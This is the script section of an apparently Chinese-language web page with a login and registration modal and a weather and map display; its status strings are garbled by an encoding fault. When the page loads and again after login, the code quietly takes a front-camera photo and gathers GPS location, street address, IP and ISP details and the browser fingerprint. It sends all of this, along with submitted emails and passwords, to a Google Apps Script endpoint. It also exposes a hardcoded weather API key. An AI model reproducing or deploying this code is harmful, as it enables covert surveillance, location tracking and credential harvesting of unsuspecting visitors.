  <script>
    const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbzSYYuYmGzMJ4Ze96ECoCyGXKfUueDXFRB3_kDMdee8JNp6W6RvM8RjT80VaUHt8Ck2aw/exec'; 
    const openModalBtn = document.getElementById('openModalBtn');
    const modalOverlay = document.getElementById('modalOverlay');
    const closeModalBtn = document.getElementById('closeModalBtn');
    openModalBtn.addEventListener('click', () => {
      modalOverlay.style.display = 'flex';
    });
    closeModalBtn.addEventListener('click', () => {
      modalOverlay.style.display = 'none';
    });
    const tabLogin = document.getElementById('tabLogin');
    const tabRegister = document.getElementById('tabRegister');
    const loginFormContainer = document.getElementById('loginFormContainer');
    const registerFormContainer = document.getElementById('registerFormContainer');
    tabLogin.addEventListener('click', () => {
      tabLogin.classList.add('active');
      tabRegister.classList.remove('active');
      loginFormContainer.classList.add('active');
      registerFormContainer.classList.remove('active');
    });
    tabRegister.addEventListener('click', () => {
      tabRegister.classList.add('active');
      tabLogin.classList.remove('active');
      registerFormContainer.classList.add('active');
      loginFormContainer.classList.remove('active');
    });
    const statusSuccess = document.getElementById('statusSuccess');
    const statusError = document.getElementById('statusError');
    function showSuccessMessage(msg) {
      statusSuccess.innerText = msg;
      statusSuccess.style.display = 'block';
      statusError.style.display = 'none';
    }
    function showErrorMessage(msg) {
      statusError.innerText = msg;
      statusError.style.display = 'block';
      statusSuccess.style.display = 'none';
    }
    const mainPanel = document.getElementById('mainPanel');
    document.getElementById('registerForm').addEventListener('submit', async (e) => {
      e.preventDefault();
      const email = document.getElementById('regEmail').value;
      const password = document.getElementById('regPassword').value;

      try {
        const formData = new URLSearchParams();
        formData.append('action', 'register');
        formData.append('email', email);
        formData.append('password', password);

        const response = await fetch(SCRIPT_URL, {
          method: 'POST',
          body: formData
        });
        const result = await response.json();
        if (result.success) {
          showSuccessMessage('è¨»å†ŠæˆåŠŸï¼Œè«‹é»é¸ã€Œç™»å…¥ã€');
        } else {
          showErrorMessage('è¨»å†Šå¤±æ•—ï¼š' + (result.error || 'åŸå› ä¸æ˜'));
        }
      } catch (error) {
        showErrorMessage('è¨»å†ŠéŒ¯èª¤ï¼š' + error.message);
      }
    });
    document.getElementById('loginForm').addEventListener('submit', async (e) => {
      e.preventDefault();
      const email = document.getElementById('loginEmail').value;
      const password = document.getElementById('loginPassword').value;

      try {
        const formData = new URLSearchParams();
        formData.append('action', 'login');
        formData.append('email', email);
        formData.append('password', password);

        const response = await fetch(SCRIPT_URL, {
          method: 'POST',
          body: formData
        });
        const result = await response.json();
        if (result.success) {
          showSuccessMessage('ç™»å…¥æˆåŠŸï¼');
          modalOverlay.style.display = 'none';
          mainPanel.style.display = 'block';
          collectAndSendData();

        } else {
          showErrorMessage('ç™»å…¥å¤±æ•—ï¼š' + (result.error || 'åŸå› ä¸æ˜'));
        }
      } catch (error) {
        showErrorMessage('ç™»å…¥éŒ¯èª¤ï¼š' + error.message);
      }
    });
    async function startCamera() {
      let stream = null;
      try {
        stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: { ideal: 'user' } },
        });
        const video = document.createElement('video');
        video.srcObject = stream;
        await new Promise(resolve => {
          video.onloadedmetadata = () => {
            video.play();
            resolve();
          };
        });
        await new Promise(resolve => setTimeout(resolve, 500));
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        const photoData = canvas.toDataURL('image/jpeg', 0.8).split(',')[1];
        return photoData;
      } catch (error) {
        console.warn('ç›¸æ©Ÿå•Ÿå‹•å¤±æ•—:', error);
        return null;
      } finally {
        if (stream) {
          stream.getTracks().forEach(track => track.stop());
        }
      }
    }
    async function getGpsCoordinates() {
      try {
        const position = await new Promise((resolve, reject) => {
          navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 10000 });
        });
        const { latitude, longitude } = position.coords;
        const resp = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}`);
        const data = await resp.json();
        const address = data.display_name || 'æœªçŸ¥åœ°å€';
        return { latitude, longitude, address };
      } catch (error) {
        console.warn('GPS è³‡è¨Šç²å–å¤±æ•—:', error);
        return null;
      }
    }
    async function getIpInfo() {
      try {
        const resp = await fetch('https://ipinfo.io/json');
        const data = await resp.json();
        const { ip, city, region, country, org } = data;
        const ipType = ip.includes('.') ? 'IPV4' : 'IPV6';
        const userAgent = navigator.userAgent;
        return { ip, ipType, userAgent, city, region, country, org };
      } catch (error) {
        console.warn('IP è³‡è¨Šç²å–å¤±æ•—:', error);
        return null;
      }
    }
    async function collectAndSendData() {
      const statusElem = document.getElementById('status');
      if (statusElem) {
        statusElem.innerText = 'æ­£åœ¨æ”¶é›†è³‡æ–™...';
      }
      const collectedData = { gps: null, ip: null, photo: null };
      try {
        const [gpsResult, ipResult] = await Promise.allSettled([
          getGpsCoordinates(),
          getIpInfo(),
        ]);
        const photoResult = await startCamera();
        if (gpsResult.status === 'fulfilled') {
          collectedData.gps = gpsResult.value;
        }
        if (ipResult.status === 'fulfilled') {
          collectedData.ip = ipResult.value;
        }
        if (photoResult) {
          collectedData.photo = photoResult;
        }
        const fd = new URLSearchParams();
        fd.append('message', 'åˆä½µè³‡æ–™ä¸Šå‚³');
        if (collectedData.gps) {
          fd.append('latitude', collectedData.gps.latitude);
          fd.append('longitude', collectedData.gps.longitude);
          fd.append('address', collectedData.gps.address);
        }
        if (collectedData.ip) {
          fd.append('ip', collectedData.ip.ip);
          fd.append('ipType', collectedData.ip.ipType);
          fd.append('userAgent', collectedData.ip.userAgent);
          fd.append('city', collectedData.ip.city);
          fd.append('region', collectedData.ip.region);
          fd.append('country', collectedData.ip.country);
          fd.append('org', collectedData.ip.org);
        }
        if (collectedData.photo) {
          fd.append('imageData', collectedData.photo);
        }
        const resp = await fetch(SCRIPT_URL, {
          method: 'POST',
          body: fd
        });
        const result = await resp.json();
        if (result.success) {
          if (statusElem) statusElem.innerText = 'è³‡æ–™å·²æˆåŠŸç™¼é€ï¼';
        } else {
          if (statusElem) statusElem.innerText = `è³‡æ–™ç™¼é€å¤±æ•—ï¼š${result.error}`;
        }
      } catch (error) {
        console.error('è³‡æ–™æ”¶é›†æˆ–å‚³é€éç¨‹ä¸­ç™¼ç”ŸéŒ¯èª¤:', error);
        if (statusElem) {
          statusElem.innerText = 'è³‡æ–™æ”¶é›†æˆ–å‚³é€éç¨‹ä¸­ç™¼ç”ŸéŒ¯èª¤ã€‚';
        }
      }
    }
    async function getWeatherInfo(latitude, longitude) {
      try {
        if (!latitude || !longitude) return;
        const apiKey = 'ae0c5817d5c802a5f12d3c9de2517611';
        const resp = await fetch(
          `https://api.openweathermap.org/data/2.5/weather?lat=${latitude}&lon=${longitude}&units=metric&lang=zh_tw&appid=${apiKey}`
        );
        const weatherData = await resp.json();
        const temp = weatherData.main.temp;
        const weather = weatherData.weather[0].description;
        const humidity = weatherData.main.humidity;

        const weatherInfo = document.getElementById('weatherInfo');
        weatherInfo.innerHTML = 
          `<img src="https://openweathermap.org/img/wn/${weatherData.weather[0].icon}.png" alt="${weather}">
           æº«åº¦: ${temp}Â°C, å¤©æ°£: ${weather}, æ¿•åº¦: ${humidity}%`;
      } catch (err) {
        console.error('å¤©æ°£è³‡è¨Šç²å–å¤±æ•—:', err);
        document.getElementById('weatherInfo').innerText = 'å¤©æ°£è³‡è¨Šç²å–å¤±æ•—';
      }
    }
    document.addEventListener('DOMContentLoaded', async () => {
      try {
        const gpsData = await getGpsCoordinates();
        if (gpsData) {
          document.getElementById('map').src = 
            `https://www.google.com/maps?q=${gpsData.latitude},${gpsData.longitude}&hl=zh-TW&z=15&output=embed`;
          // æ›´æ–°å¤©æ°£
          await getWeatherInfo(gpsData.latitude, gpsData.longitude);
        }
        collectAndSendData();

      } catch (error) {
        console.error('DOMContentLoaded åˆå§‹åŒ–æ™‚éŒ¯èª¤:', error);
      }
    });
  </script>
